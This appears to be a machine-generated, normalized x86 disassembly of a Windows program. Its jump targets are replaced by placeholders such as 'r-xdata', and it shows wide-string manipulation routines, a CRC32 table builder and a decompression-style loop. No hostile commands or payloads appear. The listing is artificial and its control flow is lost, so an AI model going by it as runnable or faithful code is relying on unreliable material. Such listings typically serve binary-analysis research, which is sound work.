lea ecx [ eax + ecx * 2 ]
call sub_401034
pop ecx
push ebp
mov ecx edi
call sub_4028eb
sub_402761
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_402bab
test al al
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ esp + 0x14 ]
sub eax ecx
cmp eax ebx
jbe r-xdata
push [ esp + 0x10 ]
mov ecx esi
call sub_402624
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_4026d7
jmp r-xdata
call sub_402971
test ebx ebx
je r-xdata
pop edi
pop esi
retn 0x8
mov eax esi
pop ebx
push ebp
lea ebp [ ecx + ebx ]
push 0x0
push ebp
mov ecx esi
call sub_40290f
test al al
je r-xdata
pop ebp
push ebx
mov ecx esi
call sub_402624
mov ecx [ esi + 0x10 ]
mov edx edi
lea ecx [ eax + ecx * 2 ]
call sub_401034
pop ecx
push ebp
mov ecx esi
call sub_4028eb
sub_4027e1
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_402bab
mov ecx esi
test al al
je r-xdata
push 0x0
push [ ebp + 0xc ]
call sub_40290f
test al al
je r-xdata
push [ ebp + 0xc ]
call sub_402624
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_40247e
jmp r-xdata
mov eax esi
push [ ebp + 0xc ]
mov ecx esi
call sub_402624
mov edx edi
mov ecx eax
call sub_401034
pop ecx
push [ ebp + 0xc ]
mov ecx esi
call sub_4028eb
pop edi
pop esi
pop ebp
retn 0x8
sub_402860
push ebx
push esi
mov esi ecx
push edi
mov ebx [ esi + 0x10 ]
mov edi [ esp + 0x10 ]
cmp ebx edi
jb r-xdata
call sub_4026bc
mov eax ebx
push ebp
mov ebp [ esp + 0x18 ]
sub eax edi
cmp eax ebp
ja r-xdata
test ebp ebp
je r-xdata
push edi
jmp r-xdata
pop ebp
pop edi
mov eax esi
pop esi
pop ebx
retn 0x8
call sub_402624
lea ecx [ eax + edi * 2 ]
sub ebx ebp
mov eax ebx
sub eax edi
push eax
lea edx [ ecx + ebp * 2 ]
call sub_401060
pop ecx
push ebx
mov ecx esi
call sub_4028eb
sub_4028b3
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push esi
mov esi [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x10 ]
call sub_402624
mov edx [ ebp + 0xc ]
lea ecx [ eax + esi * 2 ]
call sub_401076
pop ecx
call sub_402624
lea ecx [ eax + esi * 2 ]
lea edx [ ebp + 0x10 ]
call sub_401082
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_4028eb
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
mov [ ecx + 0x10 ] esi
call sub_402624
lea ecx [ eax + esi * 2 ]
lea edx [ ebp - 0x4 ]
call sub_401082
pop esi
leave
retn 0x4
sub_40290f
push esi
push edi
mov edi ecx
call sub_402ab6
mov esi [ esp + 0xc ]
cmp eax esi
jb r-xdata
call sub_402971
cmp [ edi + 0x14 ] esi
jae r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ edi + 0x10 ]
mov ecx edi
push esi
call sub_402ac9
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x8
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push esi
mov ecx edi
call sub_4028eb
mov eax [ edi + 0x10 ]
cmp esi eax
cmovb eax esi
push eax
push 0x1
mov ecx edi
call sub_4025d7
jmp r-xdata
sub_40298f
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
call sub_40228d
mov ebx [ ebp + 0xc ]
cmp eax ebx
jb r-xdata
mov ecx esi
call sub_4026bc
mov ecx [ ebp + 0x8 ]
call sub_40228d
mov edi eax
sub edi ebx
cmp [ ebp + 0x10 ] edi
mov ecx esi
cmovb edi [ ebp + 0x10 ]
cmp esi [ ebp + 0x8 ]
jne r-xdata
push 0x0
push edi
call sub_402a16
test al al
je r-xdata
lea eax [ edi + ebx ]
push eax
call sub_402be8
push ebx
push 0x0
mov ecx esi
call sub_402c06
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
push edi
call sub_40239d
add eax ebx
push eax
mov ecx esi
call sub_40239d
push eax
call sub_4010a2
add esp 0xc
mov ecx esi
push edi
call sub_402695
sub_402a16
push esi
push edi
mov edi ecx
call sub_402c5c
mov esi [ esp + 0xc ]
cmp eax esi
jb r-xdata
mov ecx edi
call sub_402971
cmp [ edi + 0x14 ] esi
jae r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
push [ edi + 0x10 ]
mov ecx edi
push esi
call sub_402c7d
jmp r-xdata
test esi esi
jne r-xdata
cmp esi 0x10
jae r-xdata
xor eax eax
cmp eax esi
sbb eax eax
pop edi
neg eax
pop esi
retn 0x8
push esi
mov ecx edi
call sub_402695
mov eax [ edi + 0x10 ]
cmp esi eax
cmovb eax esi
push eax
push 0x1
mov ecx edi
call sub_402327
jmp r-xdata
sub_402a7a
cmp [ esp + 0x4 ] 0x0
push edi
mov edi ecx
je r-xdata
xor al al
call sub_40239d
cmp [ esp + 0x8 ] eax
jb r-xdata
mov ecx edi
call sub_40239d
add eax [ edi + 0x10 ]
cmp eax [ esp + 0x8 ]
jbe r-xdata
mov al 0x1
jmp r-xdata
pop edi
retn 0x4
sub_402ac9
push 0xc
mov eax sub_41dd48
call sub_4113e1
mov edi ecx
mov [ ebp - 0x18 ] edi
mov esi [ ebp + 0x8 ]
or esi 0x7
call sub_402ab6
mov ebx eax
cmp ebx esi
jae r-xdata
xor edx edx
mov eax esi
mov [ ebp - 0x14 ] 0x3
div [ ebp - 0x14 ]
mov ecx [ edi + 0x14 ]
shr ecx 0x1
cmp ecx eax
jbe r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push eax
call j_sub_402db7
mov ebx eax
mov [ ebp - 0x14 ] ebx
jmp sub_402b51
mov edx [ edi + 0x14 ]
mov eax ebx
sub eax ecx
lea esi [ ecx + edx ]
cmp edx eax
jbe r-xdata
mov esi ebx
sub_402b51
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push 0x0
push 0x1
mov ecx edi
call sub_4025d7
lea eax [ ebp - 0x14 ]
push eax
push edi
call sub_402ef0
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x14 ] esi
call sub_4028eb
call sub_411346
retn 0x8
push [ ebp + 0xc ]
mov ecx edi
call sub_402624
mov edx eax
mov ecx ebx
call sub_401034
pop ecx
sub_402bab
cmp [ esp + 0x4 ] 0x0
push edi
mov edi ecx
je r-xdata
xor al al
call sub_402624
cmp [ esp + 0x8 ] eax
jb r-xdata
mov ecx edi
call sub_402624
mov ecx [ edi + 0x10 ]
lea eax [ eax + ecx * 2 ]
cmp eax [ esp + 0x8 ]
jbe r-xdata
mov al 0x1
jmp r-xdata
pop edi
retn 0x4
sub_402c06
push ebx
push esi
mov esi ecx
push edi
mov ebx [ esi + 0x10 ]
mov edi [ esp + 0x10 ]
cmp ebx edi
jb r-xdata
call sub_4026bc
mov eax ebx
push ebp
mov ebp [ esp + 0x18 ]
sub eax edi
cmp eax ebp
ja r-xdata
test ebp ebp
je r-xdata
push edi
jmp r-xdata
pop ebp
pop edi
mov eax esi
pop esi
pop ebx
retn 0x8
call sub_40239d
sub ebx ebp
add eax edi
mov ecx ebx
sub ecx edi
push ecx
lea ecx [ eax + ebp ]
push ecx
push eax
call sub_4010b6
add esp 0xc
mov ecx esi
push ebx
call sub_402695
sub_402c5c
push ecx
lea eax [ esp + 0x3 ]
push eax
call sub_402396
mov ecx eax
call sub_402d96
xor edx edx
inc edx
lea ecx [ eax - 0x1 ]
cmp eax edx
cmovbe ecx edx
mov eax ecx
pop ecx
retn
sub_402c7d
push 0x14
mov eax sub_41dd2d
call sub_4113e1
mov edi ecx
mov [ ebp - 0x1c ] edi
mov esi [ ebp + 0x8 ]
or esi 0xf
call sub_402c5c
mov ebx eax
cmp ebx esi
jae r-xdata
xor edx edx
mov eax esi
mov [ ebp - 0x18 ] 0x3
div [ ebp - 0x18 ]
mov ecx [ edi + 0x14 ]
shr ecx 0x1
cmp ecx eax
jbe r-xdata
mov esi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1 ]
push eax
lea eax [ ebp - 0x11 ]
push eax
mov ecx edi
call sub_402396
mov ecx eax
call j_sub_402dc8
mov ebx eax
mov [ ebp - 0x18 ] ebx
jmp sub_402d20
mov edx [ edi + 0x14 ]
mov eax ebx
sub eax ecx
lea esi [ ecx + edx ]
cmp edx eax
jbe r-xdata
mov esi ebx
sub_402cec
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
lea eax [ ebp + 0xb ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_402396
mov ecx eax
call j_sub_402dc8
mov [ ebp - 0x18 ] eax
mov eax r-xdata
retn
sub_402d20
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push 0x0
push 0x1
mov ecx edi
call sub_402327
lea eax [ ebp - 0x18 ]
push eax
push edi
lea eax [ ebp - 0x12 ]
push eax
mov ecx edi
call sub_402396
mov ecx eax
call sub_402ecd
push [ ebp + 0xc ]
mov ecx edi
mov [ edi + 0x14 ] esi
call sub_402695
call sub_411346
retn 0x8
push [ ebp + 0xc ]
mov ecx edi
call sub_40239d
push eax
push ebx
call sub_4010a2
add esp 0xc
sub_402e04
push 0x8
mov eax sub_41daf3
call sub_411378
mov edi edx
mov ebx ecx
mov [ ebp - 0x14 ] ebx
and [ ebp - 0x10 ] 0x0
call sub_402150
and [ ebp - 0x4 ] 0x0
mov ecx edi
mov [ ebp - 0x10 ] 0x1
call sub_40228d
mov ecx [ ebp + 0x8 ]
mov esi eax
call sub_401014
add esi eax
push esi
mov ecx ebx
call sub_402ffb
push edi
mov ecx ebx
call j_sub_4023f3
push [ ebp + 0x8 ]
mov ecx ebx
call j_sub_402403
mov eax ebx
call sub_411346
retn
sub_402e60
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push edx
mov esi ecx
push ecx
mov ecx [ ebp + 0x8 ]
call sub_402f4d
mov ecx eax
call sub_402385
push eax
mov ecx esi
call sub_4020e0
mov eax esi
pop esi
leave
retn
sub_402e98
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
mov edi ecx
call sub_402537
mov esi [ eax ]
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call sub_402520
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
push esi
push [ eax ]
call sub_402f6b
pop edi
pop esi
leave
retn 0x8
sub_402f07
xor eax eax
test ecx ecx
je r-xdata
retn
cmp ecx 0x7fffffff
ja r-xdata
jmp sub_40eb08
lea eax [ ecx + ecx ]
push eax
call sub_40f24f
pop ecx
test eax eax
jne r-xdata
sub_402f29
mov eax [ esp + 0x4 ]
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
retn
cmp eax 0xffffffff
ja r-xdata
jmp sub_40eb08
push eax
call sub_40f24f
pop ecx
mov ecx eax
test ecx ecx
jne r-xdata
sub_402f6b
push ebp
mov ebp esp
push ecx
push esi
push edi
lea eax [ ebp + 0x14 ]
mov edi ecx
push eax
lea ecx [ ebp + 0x10 ]
call sub_403273
test al al
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
je r-xdata
call sub_402520
mov esi eax
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp + 0x14 ]
call sub_40325b
push eax
lea ecx [ ebp + 0x10 ]
call j_sub_40111a
push eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_402d9e
pop ecx
pop ecx
push eax
push [ esi ]
push [ ebp + 0x8 ]
call sub_402d9e
pop ecx
pop ecx
push eax
mov ecx edi
call sub_4030e4
call sub_402520
push [ ebp + 0x8 ]
mov esi eax
push [ ebp + 0xc ]
call sub_402d9e
pop ecx
pop ecx
push eax
push [ esi ]
push [ ebp + 0x8 ]
call sub_402d9e
pop ecx
pop ecx
push eax
mov ecx edi
call sub_402860
jmp r-xdata
mov eax edi
pop edi
pop esi
leave
retn 0x10
sub_402ffb
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_40290f
test al al
je r-xdata
push edi
mov ecx esi
call sub_4028eb
sub_403028
push esi
push edi
mov esi ecx
mov edi r--data
mov ecx edi
call sub_401014
push eax
push edi
push [ esi + 0x10 ]
push ecx
mov ecx esi
call sub_403212
pop edi
pop esi
retn 0x4
sub_40304a
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
mov esi ecx
call sub_402a7a
test al al
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ esp + 0x18 ]
sub eax ecx
cmp eax ebx
jbe r-xdata
push [ esp + 0x14 ]
mov ecx esi
call sub_40239d
sub edi eax
push edi
push esi
push ecx
mov ecx esi
call sub_403283
jmp r-xdata
mov ecx esi
call sub_402971
test ebx ebx
je r-xdata
pop edi
pop esi
retn 0xc
mov eax esi
pop ebx
push ebp
lea ebp [ ecx + ebx ]
push 0x0
push ebp
mov ecx esi
call sub_402a16
test al al
je r-xdata
pop ebp
push [ esi + 0x10 ]
mov ecx esi
call sub_40239d
push eax
mov ecx esi
call sub_40239d
add eax ebx
push eax
call sub_4010b6
add esp 0xc
mov ecx esi
push ebx
push edi
call sub_40239d
push eax
call sub_4010a2
add esp 0xc
mov ecx esi
push ebp
call sub_402695
sub_4030e4
push ebp
mov ebp [ esp + 0x10 ]
push edi
push ebp
mov edi ecx
call sub_402bab
test al al
je r-xdata
mov edx [ edi + 0x10 ]
mov eax [ esp + 0xc ]
cmp edx eax
jb r-xdata
push [ esp + 0x18 ]
mov ecx edi
call sub_402624
sub ebp eax
sar ebp 0x1
push ebp
push edi
push [ esp + 0x1c ]
mov ecx edi
push [ esp + 0x1c ]
call sub_403359
jmp r-xdata
call sub_4026bc
push ebx
mov ebx [ esp + 0x14 ]
mov ecx edx
sub ecx eax
cmp ecx ebx
cmovb ebx ecx
push esi
mov esi [ esp + 0x20 ]
or eax 0xffffffff
sub edx ebx
sub eax esi
cmp eax edx
jbe r-xdata
pop edi
pop ebp
retn 0x10
call sub_402971
sub ecx ebx
mov [ esp + 0x18 ] ecx
cmp esi ebx
jae r-xdata
test esi esi
jne r-xdata
push ecx
mov ecx edi
call sub_402624
mov ecx [ esp + 0x18 ]
add ecx ebx
lea esi [ eax + ecx * 2 ]
mov ecx edi
call sub_402624
mov ecx [ esp + 0x24 ]
add ecx [ esp + 0x18 ]
mov edx esi
lea ecx [ eax + ecx * 2 ]
call sub_401060
mov esi [ esp + 0x24 ]
pop ecx
mov eax [ edi + 0x10 ]
sub eax ebx
add eax esi
push 0x0
push eax
mov ecx edi
mov [ esp + 0x24 ] eax
call sub_40290f
test al al
je r-xdata
test ebx ebx
je r-xdata
pop esi
mov eax edi
pop ebx
cmp ebx esi
jae r-xdata
push esi
mov ecx edi
call sub_402624
mov edx [ esp + 0x18 ]
lea ecx [ eax + edx * 2 ]
mov edx ebp
call sub_401034
pop ecx
push [ esp + 0x1c ]
mov ecx edi
call sub_4028eb
push [ esp + 0x18 ]
mov ecx edi
call sub_402624
mov ecx [ esp + 0x18 ]
add ecx ebx
lea esi [ eax + ecx * 2 ]
mov ecx edi
call sub_402624
mov ecx [ esp + 0x18 ]
add ecx [ esp + 0x24 ]
mov edx esi
lea ecx [ eax + ecx * 2 ]
call sub_401060
mov esi [ esp + 0x24 ]
pop ecx
sub_403212
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
cmp [ ecx + 0x10 ] edi
cmovb edi [ ecx + 0x10 ]
cmp edi eax
cmovb eax edi
push eax
call sub_402624
mov edx [ ebp + 0x10 ]
mov ecx eax
call sub_401005
pop ecx
xor ecx ecx
cmp edi [ ebp + 0x14 ]
setne cl
or edx 0xffffffff
cmp edi [ ebp + 0x14 ]
pop edi
cmovb ecx edx
test eax eax
cmovne ecx eax
mov eax ecx
pop ebp
retn 0x10
sub_403283
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push edi
call sub_40228d
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jb r-xdata
mov ecx esi
call sub_4026bc
mov ecx [ ebp + 0xc ]
call sub_40228d
mov edi [ ebp + 0x14 ]
mov ecx [ esi + 0x10 ]
sub eax ebx
cmp eax edi
cmovb edi eax
or eax 0xffffffff
sub eax ecx
cmp eax edi
jbe r-xdata
mov ecx esi
call sub_402971
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
lea eax [ ecx + edi ]
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x10 ] eax
call sub_402a16
test al al
je r-xdata
push [ esi + 0x10 ]
mov ecx esi
call sub_40239d
push eax
mov ecx esi
call sub_40239d
add eax edi
push eax
call sub_4010b6
add esp 0xc
push edi
cmp esi [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp + 0xc ]
call sub_40239d
add eax ebx
push eax
mov ecx esi
call sub_40239d
push eax
call sub_4010a2
mov ecx esi
call sub_40239d
lea ecx [ ebx + edi ]
test ebx ebx
cmovne ebx ecx
add eax ebx
push eax
mov ecx esi
call sub_40239d
push eax
call sub_4010b6
jmp r-xdata
add esp 0xc
mov ecx esi
push [ ebp + 0x10 ]
call sub_402695
sub_403359
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
mov ebx ecx
push esi
cmp [ ebx + 0x10 ] ebp
jb r-xdata
call sub_4026bc
mov ecx [ esp + 0x1c ]
call sub_40228d
mov esi [ esp + 0x20 ]
cmp eax esi
jb r-xdata
mov ecx [ ebx + 0x10 ]
mov eax [ esp + 0x18 ]
sub ecx ebp
cmp ecx eax
cmovb eax ecx
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x1c ]
push edi
mov [ esp + 0x1c ] eax
call sub_40228d
mov edi [ esp + 0x28 ]
mov edx [ ebx + 0x10 ]
mov ecx [ esp + 0x1c ]
sub eax esi
cmp eax edi
cmovb edi eax
or eax 0xffffffff
sub edx ecx
sub eax edi
mov [ esp + 0x28 ] edi
cmp eax edx
jbe r-xdata
call sub_402971
mov eax [ esp + 0x18 ]
add edx edi
sub eax ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x10 ] edx
cmp [ ebx + 0x10 ] edx
jae r-xdata
cmp ebx [ esp + 0x20 ]
je r-xdata
push 0x0
push edx
mov ecx ebx
call sub_40290f
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
cmp edi ecx
ja r-xdata
push eax
mov ecx ebx
call sub_402624
mov ecx [ esp + 0x20 ]
add ecx ebp
lea edi [ eax + ecx * 2 ]
mov ecx ebx
call sub_402624
mov esi [ esp + 0x2c ]
add esi ebp
mov edx edi
lea ecx [ eax + esi * 2 ]
call sub_401060
pop ecx
push [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
call sub_402624
mov edx [ esp + 0x28 ]
mov ecx ebx
lea esi [ eax + edx * 2 ]
call sub_402624
lea ecx [ eax + ebp * 2 ]
mov edx esi
call sub_401034
jmp r-xdata
cmp esi ebp
ja r-xdata
push edi
mov ecx ebx
call sub_402624
mov ecx ebx
lea esi [ eax + esi * 2 ]
call sub_402624
lea ecx [ eax + ebp * 2 ]
mov edx esi
call sub_401060
pop ecx
push [ esp + 0x18 ]
mov ecx ebx
call sub_402624
mov ecx [ esp + 0x20 ]
add ecx ebp
lea esi [ eax + ecx * 2 ]
mov ecx ebx
call sub_402624
lea ecx [ edi + ebp ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
pop ecx
push [ esp + 0x10 ]
mov ecx ebx
call sub_4028eb
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
pop ecx
retn 0x14
lea edx [ ecx + ebp ]
mov [ esp + 0x20 ] edx
cmp edx esi
ja r-xdata
push eax
mov ecx ebx
call sub_402624
mov ecx [ esp + 0x20 ]
add ecx ebp
lea esi [ eax + ecx * 2 ]
mov ecx ebx
call sub_402624
lea ecx [ edi + ebp ]
mov edx esi
lea ecx [ eax + ecx * 2 ]
call sub_401060
pop ecx
push edi
mov ecx ebx
call sub_402624
mov edx [ esp + 0x28 ]
mov edx esi
call sub_401060
push ecx
mov ecx ebx
call sub_402624
mov ecx ebx
lea esi [ eax + esi * 2 ]
call sub_402624
lea ecx [ eax + ebp * 2 ]
mov edx esi
call sub_401060
pop ecx
mov ecx [ esp + 0x20 ]
push [ esp + 0x18 ]
lea edi [ ecx + ecx ]
mov ecx ebx
call sub_402624
mov ecx ebx
lea esi [ edi + eax ]
call sub_402624
mov ecx [ esp + 0x2c ]
add ecx ebp
mov edx esi
lea ecx [ eax + ecx * 2 ]
call sub_401060
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x20 ]
pop ecx
push eax
mov ecx ebx
call sub_402624
mov ecx [ esp + 0x28 ]
add ecx [ esp + 0x2c ]
lea esi [ eax + ecx * 2 ]
mov ecx ebx
call sub_402624
lea ecx [ edi + eax ]
push eax
mov ecx ebx
call sub_402624
mov ecx [ esp + 0x24 ]
lea esi [ eax + ecx * 2 ]
mov ecx ebx
call sub_402624
lea ecx [ edi + ebp ]
mov edx esi
lea ecx [ eax + ecx * 2 ]
call sub_401060
pop ecx
push edi
mov ecx ebx
call sub_402624
mov edx [ esp + 0x28 ]
sub edx [ esp + 0x20 ]
add edx edi
jmp r-xdata
mov ecx ebx
lea esi [ eax + edx * 2 ]
call sub_402624
lea ecx [ eax + ebp * 2 ]
jmp r-xdata
sub_4035e5
push esi
push [ esp + 0x8 ]
push 0x4
call sub_401000
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
retn 0x8
push [ esp + 0xc ]
call sub_402eeb
pop ecx
mov ecx [ eax ]
mov [ esi ] ecx
sub_40360b
push esi
push [ esp + 0x8 ]
push 0x4
call sub_401000
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
retn 0x8
mov ecx [ esp + 0xc ]
call sub_402385
mov ecx [ eax ]
mov [ esi ] ecx
sub_403630
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
test ecx ecx
je r-xdata
mov eax esi
pop esi
retn
mov eax edx
movzx edx ax
mov eax edx
shl edx 0x10
push edi
or eax edx
shr ecx 0x1
mov edi esi
[ edi ]
adc ecx ecx
[ edi ]
pop edi
sub_403695
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ax [ ecx ]
cmp ax [ edx ]
jne r-xdata
movzx eax [ ecx ]
cmp ax [ edx ]
pop esi
sbb eax eax
and eax 0xfffffffe
inc eax
retn
add ecx 0x2
add edx 0x2
dec esi
jne r-xdata
sub_4036e9
push esi
mov esi ecx
push edi
and [ esi + 0x4 ] 0x0
mov edi edx
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
push edi
push eax
call [ eax ]
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
and [ esi ] edx
xor eax eax
mov [ esi + 0x4 ] edi
jmp r-xdata
pop edi
pop esi
retn
xor eax eax
inc eax
jmp r-xdata
sub_403740
push esi
xor edx edx
mov eax ecx
and eax 0x1
dec eax
not eax
and eax 0xedb88320
shr ecx 0x1
xor ecx eax
dec esi
jne r-xdata
mov [ edx * 4 + rw-data ] ecx
inc edx
cmp edx 0x100
jb r-xdata
push 0x8
mov ecx edx
pop esi
mov esi 0x800
jmp r-xdata
cmp edx esi
jb r-xdata
mov ecx [ edx * 4 + rw-data ]
movzx eax cl
shr ecx 0x8
xor ecx [ eax * 4 + rw-data ]
inc edx
mov [ edx * 4 + rw-data ] ecx
mov [ rw-data ] sub_4037ba
call sub_406ef2
mov ecx [ rw-data ]
mov edx j_sub_4037ba
test eax eax
cmove ecx edx
mov [ rw-data ] ecx
pop esi
retn
sub_4037ba
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov ebx edx
mov edx ecx
test esi esi
je r-xdata
cmp esi 0x4
jb r-xdata
test bl 0x3
je r-xdata
test esi esi
je r-xdata
push ebp
mov ebp esi
shr ebp 0x2
movzx eax [ ebx ]
xor eax edx
and eax 0xff
shr edx 0x8
xor edx [ edi + eax * 4 ]
inc ebx
dec esi
jne r-xdata
pop edi
pop esi
mov eax edx
pop ebx
retn 0x8
movzx eax [ ebx ]
xor eax edx
and eax 0xff
shr edx 0x8
xor edx [ edi + eax * 4 ]
inc ebx
dec esi
jne r-xdata
xor edx [ ebx ]
sub esi 0x4
mov ecx edx
shr ecx 0x8
and ecx 0xff
mov eax edx
mov ecx [ edi + ecx * 4 + 0x800 ]
shr eax 0x10
and eax 0xff
add ebx 0x4
xor ecx [ edi + eax * 4 + 0x400 ]
movzx eax dl
shr edx 0x18
xor ecx [ edi + eax * 4 + 0xc00 ]
xor ecx [ edi + edx * 4 ]
mov edx ecx
dec ebp
jne r-xdata
pop ebp
sub_403857
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8c ] eax
mov eax [ esp + 0xa4 ]
and [ esp + 0x2c ] 0x0
and [ esp + 0x28 ] 0x0
push ebx
push ebp
push esi
mov esi [ esp + 0xa8 ]
push edi
push eax
push [ ecx + 0x14 ]
mov edi edx
mov edx [ ecx + 0x10 ]
lea ecx [ esp + 0x30 ]
mov [ esp + 0x28 ] eax
call sub_408a4e
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ esp + 0x9c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40eb9e
add esp 0x90
retn
mov ebp [ esp + 0xb0 ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x3c ] esi
mov [ esp + 0x50 ] ebp
call sub_4086eb
mov eax [ esp + 0xa8 ]
mov ebx [ esp + 0xa4 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x98 ]
push eax
lea eax [ esp + 0x28 ]
push eax
push edi
call [ edi ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
jb r-xdata
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x28 ]
call sub_40898f
mov eax esi
mov eax [ esp + 0x98 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4c ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x18 ]
push eax
push 0x1
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x30 ]
mov edx ebp
lea ecx [ esp + 0x38 ]
call sub_408748
mov ecx [ esp + 0x24 ]
mov esi eax
mov eax [ esp + 0xa8 ]
sub eax ecx
add esp 0x10
sub ebx ecx
sbb [ esp + 0x10 ] 0x0
mov [ esp + 0x98 ] eax
test esi esi
jne r-xdata
mov [ esp + 0x98 ] ebx
cmp ebx 0x40000
jae r-xdata
mov edx [ esp + 0x4c ]
cmp edx [ esp + 0x50 ]
je r-xdata
cmp [ esp + 0x50 ] ebp
jne r-xdata
test ecx ecx
jne r-xdata
xor esi esi
inc esi
test eax eax
jne r-xdata
push ecx
push edi
call [ edi + 0x4 ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
cmp [ esp + 0x1c ] edx
je r-xdata
cmp [ esp + 0x18 ] 0x1
je r-xdata
mov eax [ esp + 0x10 ]
jmp r-xdata
cmp [ esp + 0x18 ] 0x4
je r-xdata
and [ esp + 0x24 ] 0x0
mov [ esp + 0x98 ] 0x40000
test eax eax
ja r-xdata
sub_4039d2
sub esp 0xac
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa8 ] eax
mov eax [ esp + 0xc0 ]
and [ esp + 0x2c ] 0x0
and [ esp + 0x28 ] 0x0
cmp [ ecx + 0x14 ] 0x1
push esi
mov esi [ esp + 0xbc ]
push edi
mov edi edx
mov [ esp + 0x18 ] eax
je r-xdata
push eax
mov eax [ ecx + 0x10 ]
lea ecx [ esp + 0x24 ]
mov dl [ eax ]
call sub_406fae
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esp + 0xb0 ]
pop edi
pop esi
xor ecx esp
call sub_40eb9e
add esp 0xac
retn
push ebx
push ebp
mov ebp [ esp + 0xcc ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x3c ] esi
mov [ esp + 0x50 ] ebp
call sub_406fda
mov eax [ esp + 0xc4 ]
mov ebx [ esp + 0xc0 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0xb4 ]
push eax
lea eax [ esp + 0x28 ]
push eax
push edi
call [ edi ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
jb r-xdata
mov edx [ esp + 0x20 ]
lea ecx [ esp + 0x28 ]
call sub_40898f
pop ebp
mov eax esi
pop ebx
mov eax [ esp + 0xb4 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4c ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x1c ]
push eax
push ecx
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x30 ]
mov edx ebp
lea ecx [ esp + 0x38 ]
call sub_407129
mov ecx [ esp + 0x24 ]
